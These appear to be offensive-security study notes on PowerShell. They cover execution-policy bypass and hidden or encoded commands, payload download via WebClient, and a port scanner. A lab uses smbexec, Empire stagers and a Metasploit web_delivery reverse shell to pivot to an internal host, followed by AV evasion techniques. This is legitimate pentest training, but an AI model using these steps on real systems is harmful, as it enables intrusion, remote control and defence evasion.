# ‚áí Powershell Fundamentals‚Ä¶

### What is Powershell?

- A powerful built-in command line interpreter and Task Oriented scripting language Environment
- Used By Sys-Administrators and Pen-testers ‚Ä¶
- It integrated tightly with the **.NET framework**(_**Built on top of it actually.**_)
- It Provide access to _**.NET framework API**_, _**Component Object Model(COM)**_ and _**Windows Management Instrumentation (WMI)**_. | You Will Have access to execute PS commands in Memory..
- Scripts extension == .ps1.
- ( CMDlets ) ‚áí Its a Native Powershell commands ‚ÄúWe Can Create our own‚Äù.

### **‚áí References:**

1- [https://en.wikipedia.org/wiki/Command-line_interface#Command-line_interpreter](https://en.wikipedia.org/wiki/Command-line_interface#Command-line_interpreter)

2- [https://en.wikipedia.org/wiki/Component_Object_Model](https://en.wikipedia.org/wiki/Component_Object_Model)

3- [https://en.wikipedia.org/wiki/.NET_Framework](https://en.wikipedia.org/wiki/.NET_Framework)

4- [https://www.crowdstrike.com/en-us/blog/investigating-powershell-command-and-script-logging/](https://www.crowdstrike.com/en-us/blog/investigating-powershell-command-and-script-logging/)

5- [https://learn.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page)

---

### Why Powershell?

- One of the Most important language skill for you as a pen-tester
- When we talk about Powershell we talk about **Active Directory‚Ä¶**
- It Allows us to take advantage from ‚Äú**Living-off-the-land**‚Äù Concept‚Ä¶
- Many of organization aren‚Äôt actively hunting for powershell activity since its usually considered a ‚ÄúTrusted‚Äù application.
- We can Use Powershell to **RUN,DOWNLOAD AND EXECUTE** Code in the memory process to evade endpoints sec-Solution.
- We can use it to interface with .NET and other Windows API.
- We Can Call Windows DLL Functions from Powershell
- we can Use it to bypass application Whitelisting implementation by running the usual OS Commands from Powershell CLI
- Many Tools are already available to us to use for a large numbers of purposes related to penetration testing
- Reduce our foot printing and evade defenses mechanisms while conducting Post-Exploitation tasks.

### **‚áí References:**

1- [https://www.kiteworks.com/risk-compliance-glossary/living-off-the-land-attacks/](https://www.kiteworks.com/risk-compliance-glossary/living-off-the-land-attacks/)

2- [https://lolbas-project.github.io/](https://lolbas-project.github.io/)

3- [https://github.com/PowerShellMafia/PowerSploit](https://github.com/PowerShellMafia/PowerSploit)

---

### The Powershell CLI:

- It Provide us access to built in CMDlets, Modules, Functions, Variables interactively and more, directly from the CLI.
- You Can Access Powershell by typing **`powershell`** in the CMD Prompt.
- If Possible we Should Run the PS as administrator (if Possible).

<aside> <img src="/icons/verified_blue.svg" alt="/icons/verified_blue.svg" width="40px" />

_**First thing to do when Learning a new tool is Accessing the help Menu i our case we type : `powershell /?`**_

</aside>

### ‚áí Basic Parameters usage for our purposes:

```powershell
## Execution Policy :
1) PS C:\\> -ExecutionPolicy OR "-ep bypass" OR "-ex by" Bypass .\\script.ps1 
2) PS C:\\> -ExecutionPolicy Unrestrected .\\script.ps1 ## The global execution policy unrestrected.
3) PS C:\\> -WindowsStyle Hiddden OR "-W h " OR " -Wi hi" .\\script.ps1 ## It Hide the powershell window from the actuall OS.
4) PS C:\\> -Command "& {Get-EventLog -LogName security }" ## to spicify a command to run.
5) PS C:\\> -EncodedCommand  OR "-enco" OR "-ec" ## Allows you to execute a base64 encoded commands.
6) PS C:\\> -NoProfile .\\scripts.ps1v## Dont Load Any PS Profile.
7) PS C:\\> -Version 2 ## allows you to Downgrade the Powershell Version "If Neaded"
##-----------------------------------------------
## Getting Help in Exect anything in our CLI ::
1) PS C:\\> Get-Help [xyz]
## Getting Full help ::
2) PS C:\\> Get-Help [xyz] -Full
## Getting Examples on How To Use ::
3) PS C:\\> Get-Help [Xyz] -Examples
## Update Your Help ::
4) PS C:\\> Update-Help
##-----------------------------------------------
## => A VERY VERY Usefull CMDlet :
PS C:\\> Get-Command ## It Allows us to list all command, cmdlets, functions, workflow, filters, scripts and every app avaliable to us rom Powershell
## Example:
PS C:\\> Get-Command -Name *Firewall* ## Same as 'grep' in Linux ..
```

---

### PowerShell CMDlets ‚ÄúCommand-Lets‚Äù:

_**A Big Part of How We Can leverage Powershell For Our Offensive Purposes‚Ä¶**_

### ‚áí What is CMDlets ?

- Light-Weight Powershell scripts that Perform Single Function. Notice That Powershell comes with its built-in CMDlets but the great Point here that We can make our own! _**‚ÄúSame as Function in any programming language‚Äù**_
- Typically written in _**(verb-noun)**_, that help to know their functionality ‚Üí (Get-Xyz)
- Typically used to return output to other CMDlets to be then Processed via a Pipeline ‚Äú|‚Äù
- Every CMDlets has its own set of params which can be Discovered through the `Get-Help` cmdlets, Same as **`-h`** in linux

_**Note**: Every CMDlets by defaults when run without params will return a limited set of info .._


### `Get-Process`, `Get-Alias`.

- Gives us a list of all process.
- Alone will not give much so Pipe it with `Format-List *` as in the Code Section!

```powershell
# Get- Process = Printing all process:
***1)*** PS C:\\> Get-Process | Format-List * # To Get All Properites that we can Pipe it to format listand How We Can Filter The Data..
***2)*** PS C:\\> Get-Process chrome, firefox | Sort-Object -Unique | Format-List Path # To Display the Path ..
# -> We Can Pipline some commands to print more info from specific CMDlets
# -> For Ex:
PS C:\\> Get-Process | Sort-Object -Unique | Select-Object ProcessName,Id
# We Can redirect the output Just Like Linux ..
PS C:\\> Get-Process | Sort-Object -Unique | **Select-Object** ProcessName,Id > uniq_proc.txt
#---------------------
# Get-Alias == Printing Aliases ..
PS C:\\> Get-Alias -Deinition Get-childItem
# Another Alias is ( Select )
PS C:\\> Get-Process | Sort-Object -Unique | **Select** ProcessName,Id # Same as **Select-Object**

```

### `Get-WmiObject`, `Get-Service` ‚áí üö©Importantüö©

- Used To Return Info about Wmi-Objects

```powershell
PS C:\\> Get-WmiObject -class win32_operatingsystem | **Select** -Property * | select-Object [anyProperty] # This will returns all info about current OS.
***# WE CAN GET A DETAILED LIST OF PROPERETES OF ALL SERVICES WITH THE 'win32_service' Class***
PS C:\\> Get-WmiObject -class ***win32_service*** | Format-List * 
## Extend those results with Sort-Object and **Get-Service**
PS C:\\> **Get-Service "s*" | Sort-Object Status -Descending**
```

### ‚áí Reference:

1- [https://learn.microsoft.com/en-us/powershell/scripting/developer/cmdlet/cmdlet-overview?view=powershell-7.4](https://learn.microsoft.com/en-us/powershell/scripting/developer/cmdlet/cmdlet-overview?view=powershell-7.4)

2- [https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.cmdlet?view=powershellsdk-7.4.0](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.cmdlet?view=powershellsdk-7.4.0)

3- [https://powershell.one/powershell-internals/scriptblocks/powershell-pipeline](https://powershell.one/powershell-internals/scriptblocks/powershell-pipeline)

4- [https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-wmiobject?view=powershell-5.1](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-wmiobject?view=powershell-5.1)

---

### Powershell Modules - The Most üö©Importantüö©

- Its a Set of Powershell Functionalities grouped together in the form of a single file that will typically have a ‚Äù.psm1‚Äù extension.
- Modules are typically comprised of several components.
- Not All Components are necessary for the Functionalities.
- Modules are Imported stuff!, to list all current imported modules use **`Get-Module`**. | To List all Available to us use **`-ListAvailable`.**
- To Import a Specific one to our current session! use this:

```powershell
PS C:\\> Import-Module .\\module.psm1 ## This is Very Very Imported!! :)
***## Demo & Check "How to Download and import Powersploit exploitation Framework"***
```

### _**‚áí Components that can make a Module is:**_

- Any Number of PS Scripts (.ps1) or Code Files like Managed CMdlets assemblies
- A Module Manifest file.
- a Directory Contain all things above!

### _**‚áí A Several Different Types of Modules:**_

1. [Script Modules](https://learn.microsoft.com/en-us/powershell/scripting/developer/module/how-to-write-a-powershell-script-module?view=powershell-7.4) : Our Focus On!.
2. [Binary Modules](https://learn.microsoft.com/en-us/powershell/scripting/developer/module/how-to-write-a-powershell-binary-module?view=powershell-7.4).
3. [Manifest](https://learn.microsoft.com/en-us/powershell/scripting/developer/module/how-to-write-a-powershell-module-manifest?view=powershell-7.4) Modules.
4. Dynamic Modules (Created Dynamically By Scripts using the ‚Äú[New-Module](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/new-module?view=powershell-7.4)‚Äù CMDlets).

### _**‚áí PS-Scripts:**_

1. Loop Statements:
    1. Powershell Support several loop statements which we can utilize for different tasks.
    2. As ‚ÄúForEach-Object‚Äù - We can use loops statements to iterate through files, Powershell object collections, and conduct port scans.
2. Our Different loop Statements:

```powershell
for()
foreach()
while()
do{something}while()
do{something}until()
# We Can Get Help For Each one Just By Using Get-Help about_Foreach, etc ...
```

1. A Really Basic TCP-Port-Scanner With Powershell:

```powershell
$ports=(80,22,23,445);
$ip="192.x.x.x";
foreach($port in $ports){
		try{
					$socket=New-Object system.Net.Sockets.TcpClient($ip,$port);
		} catch {};
		if ($socket -eq $null){echo $ip":"$port" -Closed";}else{echo $ip":"$port" -Open"; $socket = $null;}
}
```

### _**‚áí Reference:**_

1- [https://learn.microsoft.com/en-us/powershell/scripting/developer/module/how-to-write-a-powershell-binary-module?view=powershell-7.4](https://learn.microsoft.com/en-us/powershell/scripting/developer/module/how-to-write-a-powershell-binary-module?view=powershell-7.4)

2- [https://learn.microsoft.com/en-us/powershell/scripting/developer/module/how-to-write-a-powershell-script-module?view=powershell-7.4](https://learn.microsoft.com/en-us/powershell/scripting/developer/module/how-to-write-a-powershell-script-module?view=powershell-7.4)

3- [https://learn.microsoft.com/en-us/powershell/scripting/developer/module/how-to-write-a-powershell-module-manifest?view=powershell-7.4](https://learn.microsoft.com/en-us/powershell/scripting/developer/module/how-to-write-a-powershell-module-manifest?view=powershell-7.4)

4- [https://github.com/PowerShellMafia/PowerSploit](https://github.com/PowerShellMafia/PowerSploit)

5- [https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/new-module?view=powershell-7.4](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/new-module?view=powershell-7.4)

6- [https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/foreach-object?view=powershell-7.4](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/foreach-object?view=powershell-7.4)

7- [https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/where-object?view=powershell-7.4](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/where-object?view=powershell-7.4)

---

### Powershell Objects:

- Its a kind of data that provided as a results of running a CMDlets
- Powershell is different from other programming langs, whare they most of time output the data as a text the powershell output the data as objects!
- As usual, we can manipulate the objects‚Ä¶
- How we Manipulate them ? By Methods ..
- Each of the Objects Has a multiple methods that can be used to manipulate the object.
- to get the list of methods for objects associated with a CMDlets we can use **`Get-Member` as a part of pipeline command as follows :**

```powershell
PS C:\\> Get-Process | Get-Member -MemberType Method
# This Will Give Us an Idea of all of the methods for associated objects 
#------------------------
# We Can **Kill** Any Process just like that :
PS C:\\> Get-Process -Name "Calculater" | kill
```

### ‚áí How to create .NET Object ‚ÄúNew-Object CMDlet‚Äù

In PowerShell, the `New-Object` cmdlet is used to create .NET objects. Here's a simple example to demonstrate how to create a `.NET` object using this cmdlet.

### Syntax:

```powershell
New-Object -TypeName <Type> [-ArgumentList <Arguments>]
```

- **`TypeName`** specifies the fully qualified name of the .NET class you want to create.
- **`ArgumentList`** allows you to pass arguments to the constructor of the object.

### Example 1: Creating a Simple Object

Let‚Äôs say you want to create an instance of a `.NET` class, such as the `System.DateTime` class:

```powershell
$dateObject = New-Object -TypeName System.DateTime
Write-Output $dateObject
```

This creates a `DateTime` object.

### Example 2: Creating an Object with Arguments

You can also pass arguments to the constructor. For instance, let‚Äôs create a `System.IO.StreamWriter` object that writes to a file:

```powershell
$streamWriter = New-Object -TypeName System.IO.StreamWriter -ArgumentList "C:\\\\path\\\\to\\\\file.txt"
$streamWriter.WriteLine("Hello, PowerShell!")
$streamWriter.Close()
```

Here, the constructor of `StreamWriter` takes the path to a file as an argument.

### Example 3: Custom Object with Properties

You can create a custom object using `PSObject` and add properties:

```powershell
$person = New-Object PSObject
$person | Add-Member -MemberType NoteProperty -Name "FirstName" -Value "John"
$person | Add-Member -MemberType NoteProperty -Name "LastName" -Value "Doe"

Write-Output $person
```

This creates a custom object with properties `FirstName` and `LastName`.

Use **`Net.WebClient`** System Class to Download a file in this manner:

To download a file using the `System.Net.WebClient` class in PowerShell, you can utilize the `New-Object` cmdlet to create an instance of `WebClient` and then call its `DownloadFile` method. Here's how you can do it:

### _Syntax:_

```powershell
$webClient = New-Object System.Net.WebClient
$webClient.DownloadFile("<http://example.com/file.txt>", "C:\\\\path\\\\to\\\\save\\\\file.txt")
```

### Step-by-Step Example:

1. **Create a `WebClient` object** using `New-Object`.
2. **Use the `DownloadFile` method** to specify the URL and the location where the file should be saved.

### Example:

```powershell
# Create a WebClient object
$webClient = New-Object System.Net.WebClient

# Define the URL of the file to be downloaded
$fileUrl = "<https://example.com/samplefile.txt>" # OR Payload Maybe ! :)

# Define the local path where the file will be saved
$destinationPath = "C:\\\\Users\\\\YourUsername\\\\Downloads\\\\samplefile.txt"

# Download the file
$webClient.DownloadFile($fileUrl, $destinationPath)

# **Optionally**, you can print a success message
Write-Output "File downloaded successfully to $destinationPath"

# Clean up the WebClient object (**optional**)
$webClient.Dispose()
```

### Explanation:

- **`$webClient = New-Object System.Net.WebClient`**: This creates a new instance of the `WebClient` class.
- **`$webClient.DownloadFile()`**: This method takes two parameters:
    1. **File URL**: The URL where the file is located.
    2. **Destination path**: The local path where you want to save the downloaded file.
- **`$webClient.Dispose()`**: Optionally, you can dispose of the `WebClient` object once the download is complete to free up resources.

### Example with Exception Handling:

To handle any potential errors (like network issues), you can wrap the code in a `try-catch` block:

```powershell
try {
    $webClient = New-Object System.Net.WebClient
    $fileUrl = "<https://example.com/samplefile.txt>"
    $destinationPath = "C:\\\\Users\\\\YourUsername\\\\Downloads\\\\samplefile.txt"

    $webClient.DownloadFile($fileUrl, $destinationPath)
    Write-Output "File downloaded successfully to $destinationPath"
}
catch {
    Write-Error "Failed to download the file. Error: $_"
}
finally {
    $webClient.Dispose()
}
```

This approach allows you to safely handle any errors that occur during the download process.

---

## Leveraging Powershell During exploitation - LAB

_**Note: Those Steps Doesn't necessary should be the same in different Labs, You May find some errors and different scenarios based on your target architecture, network topology, etc‚Ä¶**_

_**This Lab Shows How we can pivot through our attacker machine to exploit a vulnerable target and post exploit to accessed/reach the Non-Reachable network target. using Powershell empire and Metasploit**_


### ‚áí Steps: ‚Üí Don‚Äôt Ignore CommentsüôÇ

```bash
# First We Ping our targets to know which Ip is reachable 
# 1) ....
Ping demo.demo.local # Reachable 
ping demo2.demo.local # Non-Reachable 
#--------------------------------
# 2) ....
# Running Nmap Scan on the Reachable target with full port scan parameter.
nmap -p- demo.demo.local # Chacking the non-standured ports in the Results, We find that this is microsoft web server 
# -------------------------------
# 3) ....
# Accessing the web page by specifing the hided non-standured port 
=> demo.demo.local:4983 # We Find an Admin Credintails in some kind or err :D, So Realistic :)
#--------------------------------
# 4) ....
# SMB port is avaliable so we gonna try to connect with smbexec.py as follows:
smbexec.py 'Administrator:FSR@@sf12345'@demo.demo.local # Auth Successful .., We Have Sys-Previlige
# -------------------------------
# 5) ....
# First thing to do after we gaining access is to show up our network subnet in nedded
# But now lets jumb to ping our Non-Reachable:
ping demo2.demo.local # Yes its Reachable now .. :)
#--------------------------------
# 6) ....
# Time for **Powershell empire**
Powershell-empire server # in new tab ..
Powershell-empire client # in another new tab hah :)
#--------------------------------
# 7) ....
# First Thing to do is establishing a connect on our first target : **demo.demo.local** and utilized staged to get this reverse shell sesstion
(Empire) > uselistener http # 1- Specify your host (attacker Machine) And your port ofc!,
(Empire: uselistener/http) > Set HOST 192.x.x.x
(Empire: uselistener/http) > set PORT 8888 # Or Wahtever ..
(Empire: uselistener/http) > execute # The Listener started 
(Empire: uselistener/http) > Listener # To check the listnening ..
(Empire: uselistener/http) > main # To Back to Main Page -> AKA Back to Buessnis.
# Setting Our Stagers .. 
(Empire) > usestager multi/launcher
(Empire: usestager/multi/launcher) > set Listener http
(Empire: usestager/multi/launcher) > execute
# This will Generate an obfuscated powershell code that we should run on our target system that we want sesstion on.
#--------------------------------
# 8) ...
-> Copy the obfuscated powershell code an paste it in the smbexec sesstion terminal tab and hit enter..
-> Switch to the empire tab and you will find that there is new agent checked in ! # **demo.demo.local**
# run this to make sure :
(Empire: usestager/multi/launcher) > agents # this will print agents table ..
# Every 5 Sec the empire check the connection, so every 5 Sec the target will call us :)
#--------------------------------
# Time To interact :) 
(Empire: agents) > interact *Agent name* # This is ware Powershell Comes to ..
(Empire: *Agent name*) > usemodule powershell/situational_awareness/host/computerdetails
(Empire: usemodule/powershell/situational_awareness/host/computerdetails) > execute # This may take some time
# => Now We know our target detailes..
#--------------------------------
# 9) ....
# Getting access to the demo2.demo.local via our empire sesstion ...
(Empire: *Agent name*) > usemodule powershell/situational_awareness/network/portscan # 
(Empire: usemodule/powershell/situational_awareness/network/portscan) >
# => Now You Have to spicify your target IP, in this case will be the demo2.demo.local IP. 
(Empire: usemodule/powershell/situational_awareness/network/portscan) > set HOSTS  192.x.x.x  ## For demo2.demo.local
(Empire: usemodule/powershell/situational_awareness/network/portscan) > execute # This Will Show You Open Ports in the Non-Reachable target  demo2.demo.local 
#--------------------------------
# 10) ....
# Now To MetaSploit :), We Gonna Utilaize a Web Delevery Payload to get meterpreter sesstion on the Reachable target ***First*** and then Non-Reachable target
msfconsole -q # To avoid the banner :)
msf6> search web_delivery
msf6> use exploit/multi/script/web_delivery
msf6 exploit( multi/script/web_delivery) > show options 
msf6 exploit( multi/script/web_delivery) > set target 2 # To use Powershell
msf6 exploit( multi/script/web_delivery) > set SRVHOST *Your attacker Machine IP*
msf6 exploit( multi/script/web_delivery) > set LHOST *Your attacker Machine IP* 
msf6 exploit( multi/script/web_delivery) > set payload windows/meterpreter/reverse_tcp
msf6 exploit( multi/script/web_delivery) > exploit 
***# This will Generate an obfuscated powershell code and a URL that we should run on our target system***
#--------------------------------
# 11) ....
****# -> Copy the Generated URL and Go Back to Empire Sesstion**
(Empire: *Agent name*) > usemodule powershell/code_execution/invoke_metasploitpayload
(Empire: usemodule/powershell/code_execution/invoke_metasploitpayload) > set URL ****Paste URL that you coped!****
(Empire: usemodule/powershell/code_execution/invoke_metasploitpayload) > execute # if everything goes right you should get a meterpreter sesstion on metasploit ...
******#--------------------------------
# 12) ... 
# You Should Notefid with the new sesstion, When it happend move to it ..
msf6 exploit( multi/script/web_delivery) > sesstions 1
meterpreter> sysinfo # you should get the **demo.demo.local info**
## Put This meterpreter sesstion to background ...
meterpreter> bg 
msf6 exploit( multi/script/web_delivery) > search autoroute
msf6 exploit( multi/script/web_delivery) > use post/multi/manage/autoroute
msf6 post( multi/multi/manage/autoroute) > set SESSTION 1
msf6 post( multi/multi/manage/autoroute) > run
## Now We Can Performe Port Forwarding from the non reachable to ours .
#--------------------------------
# 13) ... 
# Using auxiliary/server/socks_proxy
msf6 post( multi/multi/manage/autoroute) > use auxiliary/server/socks_proxy
msf6 auxiliary(server/socks_proxy) > show options 
msf6 auxiliary(server/socks_proxy) > set SRVHOST *Your attacker Machine IP*
msf6 auxiliary(server/socks_proxy) > run 
#--------------------------------
# 14) ... 
# Run your Browser -> Settings -> connection settings -> SOCKS Hostv5, Put your attacker machine IP and any non-Busy Port
# Access The demo2.demo.local via web browser now
#--------------------------------
Now You Can latrel movement using metasploit for farther attack and the metasploit will automatically routed the connection
```

---

## `Powershell-Empire` Framework

- AKA Empire, A Pure Powershell exploitation/post-exploitation framework built on cryptologic-secure communication and fixable architecture..
- It Allows you to run powershell agents without needing powershell.exe, Rapidly deployable post-exploitation modules from keyloggers to mimikatz, evading network detection
- Works in kali of course..

There is A GUI Frontend For empire.. StarKillerüö©

## Powershell-Empire LAB Demo:

**‚áí Objectives:** Intro to Empire, How It Works?, How Starkiller works? and How to use empire to Gain access‚Ä¶

- Q : What is The Powershell empire server ?
    - A : It is the backend of empire framework and its responsible for managing and controlling all **agents** as will as callbacks from them.
- Q: What is Stagers ?
    - A: It is just a piece of code that executed on target OS, Contain the attacker IP.
- Q: What is Agents?
    - Simply our Targets that you had gained access to.
- Q: What is Listeners ?
    - A: Like a netcat Listeners or multi handler in metasploit .. some thing what to call once the stager executed‚Ä¶

```bash
						## All Those steps are organized from 1 to whatever ...##
# Installing Empire :
		~$ sudo apt-get update && sudo apt-get dist-upgrade -y
		~$ sudo apt-get install powershell-empire starkiller -y
# --------------------------------------------------------
# Start The empire Server :
		~$ sudo powershell-empire server # This May take a while ...
# --------------------------------------------------------
# In New Tab : Run The Client
		~$ sudo powershell-empire client 
# --------------------------------------------------------
		## You Can Of course Run the Starkiller GUI Through the provided localhost link
		# That Showed up in Server Tab! or simply tibe in kali searchbar Starkiller and hit enter.
		# The Default Creds Passowrd : password123 , Username : empireadmin.,, Recommeneded to update those..
		# This GUI is pretty easy and stright forward take a look and just play arownd a little bit!
```

---

### AV Evasion With **`*Shelter`. ((Very Long one!))***

**‚áí Objectives: Know How AV Works and How they detect malware, How Can be evaded.. (In Basic way You can dig deeper later)**

### ‚áí What is `AV Detection Methods`? , You Can Search!

Antivirus detection methods can be categorized into several techniques used by modern antivirus software _**to identify and block malware. Below are the main detection methods:**_

_**These methods are often used in combination to provide robust protection against a wide variety of threats.**_


### 1. **Signature-Based Detection**

- **How it works**: Scans files for specific sequences of bytes (signatures) known to be part of malware. Each type of malware has a unique signature stored in the antivirus database.
- **Pros**: Effective for known malware.
- **Cons**: Ineffective for new or modified malware (zero-day threats).

### 2. **Heuristic-Based Detection**

- **How it works**: Analyzes the structure and behavior of code to detect suspicious patterns, even if the exact code is not in the signature database. Uses predefined rules and algorithms to flag potential threats.
- **Pros**: Can detect new or unknown malware variants.
- **Cons**: May generate false positives (benign files flagged as malware).

### 3. **Behavioral-Based Detection**

- **How it works**: Monitors the real-time behavior of files and processes in the system. If an application or process behaves maliciously (e.g., modifying system files or network activity), it is flagged.
- **Pros**: Effective against malware that is disguised or mutates over time.
- **Cons**: May require more system resources and can produce false positives.

### 4. **Sandboxing**

- **How it works**: Executes suspicious files in a controlled, isolated environment (sandbox) to observe their behavior. If malicious actions are detected, the file is flagged as malware.
- **Pros**: Provides high accuracy by allowing the antivirus to see how files behave without risking the actual system.
- **Cons**: Resource-intensive and can be slow due to the need to run each suspicious file in isolation.

### 5. **Cloud-Based Detection**

- **How it works**: Uses cloud computing to analyze suspicious files by uploading them to a cloud service for further inspection. It allows antivirus software to access up-to-date threat intelligence from a large database.
- **Pros**: Offers faster response to new threats and reduces local system resource usage.
- **Cons**: Requires an internet connection and may have privacy concerns as files are sent to external servers.

### 6. **Machine Learning/Artificial Intelligence (AI) Detection**

- **How it works**: Utilizes machine learning models trained on vast amounts of malware data to predict if a file or process is malicious based on its characteristics or behavior.
- **Pros**: Capable of detecting both known and unknown malware with a high degree of accuracy.
- **Cons**: Requires extensive computational resources for training, and models may produce false positives.

### ‚áí Some Other Methods For Detection:

### 7. **Real-Time or On-Access Scanning**

- **How it works**: Continuously monitors files and applications in real-time as they are accessed, opened, or modified, scanning them against known threat databases.
- **Pros**: Immediate protection against malicious files before they can execute.
- **Cons**: Can slow down system performance, especially with large or frequent file access.

### 8. **Integrity Checking**

- **How it works**: Monitors system and application files for any unauthorized changes by comparing current versions of files with previously stored clean versions.
- **Pros**: Good at detecting stealthy malware that attempts to modify existing system files.
- **Cons**: Ineffective against malware that does not modify files or if baseline files are already infected.

### 9. **YARA Rules**

- **How it works**: Uses a rule-based approach to define patterns for file matching. YARA rules can detect specific behaviors or byte patterns in malware.
- **Pros**: Customizable, flexible, and efficient for targeted threat hunting.
- **Cons**: Requires expertise to create and maintain effective rules.

### 10. **Network Traffic Analysis**

- **How it works**: Monitors network traffic for suspicious patterns, such as communication with command-and-control (C2) servers or anomalous data transfers.
- **Pros**: Can identify malware trying to exfiltrate data or connect to malicious servers.
- **Cons**: Requires advanced network setup and knowledge of normal traffic patterns to avoid false positives.

### 11. **Memory Scanning**

- **How it works**: Scans the system‚Äôs memory (RAM) for malware that resides in memory without writing files to disk, often used by fileless malware.
- **Pros**: Effective against malware that avoids detection by traditional disk-based methods.
- **Cons**: May be harder to detect malware that resides only briefly in memory.

### 12. **Emulation-Based Detection**

- **How it works**: Emulates the code execution of a file in a virtual environment, analyzing its behavior to determine if it performs any malicious actions before allowing it to run on the actual system.
- **Pros**: Good for detecting obfuscated or polymorphic malware.
- **Cons**: Time-consuming and resource-intensive.

### 13. **Cross-Platform Detection**

- **How it works**: Some antivirus software includes techniques to detect threats across different operating systems, especially for malware that tries to spread between platforms (e.g., Windows malware infecting Linux).
- **Pros**: Provides comprehensive protection across varied environments.
- **Cons**: Complex to implement and may introduce performance overhead.

### 14. **Reputation-Based Detection**

- **How it works**: Uses the reputation of files, URLs, or IP addresses based on a global threat database. Files or websites with poor reputation scores are flagged as malicious.
- **Pros**: Quickly detects threats without the need for deep analysis by leveraging community-driven intelligence.
- **Cons**: False positives may occur, and it requires frequent updates from the threat intelligence database.

### 15. **Polymorphic/Metamorphic Analysis**

- **How it works**: Detects malware that changes its code structure (polymorphic or metamorphic malware) to evade signature-based detection. The antivirus uses sophisticated algorithms to identify the underlying behavior or patterns in such malware.
- **Pros**: Good for malware that frequently modifies itself.
- **Cons**: Computationally demanding and may not catch all types of metamorphic malware.

### ‚áí A list of common `On-Disk Evasion Techniques`, You Can Search!

> _**On-disk evasion techniques are strategies employed by malware to avoid detection by antivirus (AV) solutions or endpoint detection and response (EDR) systems. These techniques focus on concealing malicious code or behavior in storage (i.e., on disk) to evade signature-based, heuristic, and behavioral detection methods.**_

>**_These on-disk evasion techniques are widely used by attackers to avoid detection and prolong their malware‚Äôs presence on an infected system. The combination of these techniques can significantly complicate the detection and removal process.**_


****üìç **A detailed list of common on-disk evasion techniques:**

### 1. **Fileless Malware**

- **How it works**: Malware avoids writing itself to disk and operates entirely in memory. This can bypass traditional signature-based detection, which scans files on disk.
- **Example**: The use of PowerShell scripts or WMI to execute malicious code directly in memory.

### 2. **Packing and Obfuscation**

- **How it works**: Malware uses packers, compression, or encryption to conceal the actual malicious code. When executed, the packed or obfuscated code is unpacked in memory, avoiding detection by signature-based tools.
- **Example**: UPX (Ultimate Packer for Executables) is commonly used to compress malware and hide its payload.

### 3. **Polymorphism**

- **How it works**: The malware changes its code with every infection while maintaining the same functionality. This dynamic alteration of the binary prevents signature-based antivirus systems from recognizing the malware based on previous signatures.
- **Example**: Virus polymorphs by encrypting its body with a different key or algorithm during each infection.

### 4. **Metamorphism**

- **How it works**: Similar to polymorphism, but the malware rewrites its entire code on each infection, changing its structure completely without altering its behavior.
- **Example**: Metamorphic viruses modify their code at every infection to make static analysis and signature matching difficult.

### 5. **Steganography**

- **How it works**: Malware hides its code within legitimate files, such as images, videos, or documents, to avoid detection. These files appear harmless to antivirus scanners.
- **Example**: Malicious payloads hidden in image files (e.g., JPEG or PNG) that are decoded at runtime.

### 6. **Code Injection**

- **How it works**: Malware injects itself into legitimate processes to hide its presence on disk. Injected code runs within a trusted process (e.g., explorer.exe), making it harder to detect.
- **Example**: DLL injection or process hollowing, where the malicious code replaces the legitimate code in a process‚Äôs memory space.

### 7. **Rootkits**

- **How it works**: A rootkit modifies the operating system at a low level (e.g., kernel or bootloader) to hide files, processes, or registry keys associated with malware. This prevents detection by antivirus software, even though the malware resides on disk.
- **Example**: Kernel-mode rootkits that modify system APIs to hide malicious files or directories.

### 8. **Encrypted Payloads**

- **How it works**: The malware stores its payload in an encrypted or obfuscated format on disk. The payload is decrypted only at runtime, making it difficult for AV engines to detect the malicious code when it is at rest.
- **Example**: Ransomware often stores its payload in an encrypted form to avoid detection before execution.

### 9. **Alternate Data Streams (ADS)**

- **How it works**: Malware uses the NTFS Alternate Data Stream (ADS) feature to hide its code within another legitimate file without altering the visible file size. Traditional file-scanning AV software may overlook data stored in ADS.
- **Example**: A malicious executable hidden in the ADS of a harmless text file (e.g., `legitimate.txt:malware.exe`).

### 10. **Masquerading (File Name/Extension Spoofing)**

- **How it works**: Malware disguises itself as a legitimate or system file by using common filenames or extensions (e.g., `.jpg`, `.txt`, `.doc`) to trick both users and antivirus software.
- **Example**: A malicious file named `invoice.pdf.exe` that appears to be a PDF file but is actually an executable.

### 11. **Living off the Land (LOTL)**

- **How it works**: Malware uses legitimate system tools or trusted applications (e.g., PowerShell, rundll32.exe, or regsvr32.exe) to execute malicious code without writing a separate file to disk.
- **Example**: Using PowerShell to download and execute malware from memory, avoiding the creation of any new files on disk.

### 12. **Time-Based Evasion (Sleeping)**

- **How it works**: Malware stays dormant for a specific period (or until a certain event) before activating. This helps it avoid detection during initial scans, as AV products typically scan newly created or modified files.
- **Example**: Malware that only becomes active after several days or after multiple system reboots to bypass sandbox analysis or early detection.

### 13. **File Renaming/Extension Change**

- **How it works**: Malware renames itself or changes its file extension to match a trusted file type (e.g., `.docx`, `.jpg`, `.pdf`), reducing the likelihood of being flagged by AV software.
- **Example**: A malicious executable file renamed from `.exe` to `.docx` to appear harmless.

### 14. **Dual-Use Binaries**

- **How it works**: The malware uses legitimate system tools or libraries (e.g., Windows Management Instrumentation (WMI), schtasks, or Microsoft Office macros) to perform malicious actions without directly introducing a suspicious file to disk.
- **Example**: Using a Word macro to download and execute a malicious payload.

### 15. **File Permissions Manipulation**

- **How it works**: The malware alters file permissions or attributes to make itself hidden, read-only, or inaccessible to antivirus programs and system administrators.
- **Example**: Setting a file as ‚Äúsystem‚Äù or ‚Äúhidden‚Äù to conceal it from standard directory listings or antivirus scans.

### 16. **Fragmentation/Chunking**

- **How it works**: Malware splits itself into smaller chunks or fragments to avoid detection by antivirus software. These pieces are reassembled at runtime.
- **Example**: Fragmenting a malicious payload across multiple files or sections of the disk and reassembling it in memory during execution.

